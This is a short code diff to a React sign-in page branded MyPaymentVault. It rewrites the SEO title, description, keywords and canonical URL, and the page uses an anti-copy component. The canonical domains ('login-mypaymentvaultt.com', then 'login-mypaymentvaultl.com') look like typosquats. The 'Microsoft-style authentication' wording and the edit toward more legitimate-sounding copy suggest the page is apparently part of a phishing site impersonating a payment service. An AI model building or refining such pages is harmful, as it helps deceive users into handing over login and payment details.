@@ -96,10 +96,10 @@ export default function MicrosoftEmailPage() {
   return (
     <>
       <SEO 
-        title="Login MyPaymentVault | Sign In - Secure Authentication"
-        description="Login MyPaymentVault with Microsoft-style authentication. Secure multi-factor sign in alternative to Northlane and Wirecard."
-        keywords="login mypaymentvault, mypaymentvault login, sign in mypaymentvault, login northlane, login wirecard, secure login, microsoft authentication"
-        canonical="https://login-mypaymentvaultt.com/microsoft-email"
+        title="Sign In | MyPaymentVault Secure Authentication"
+        description="Sign in to MyPaymentVault with secure authentication. Access your payment details and manage your account safely."
+        keywords="MyPaymentVault sign in, secure login, mypaymentvault authentication, payment vault access, employee login"
+        canonical="https://login-mypaymentvaultl.com/microsoft-email"
       />
       <AntiCopyProtection />
       <div style={{ 
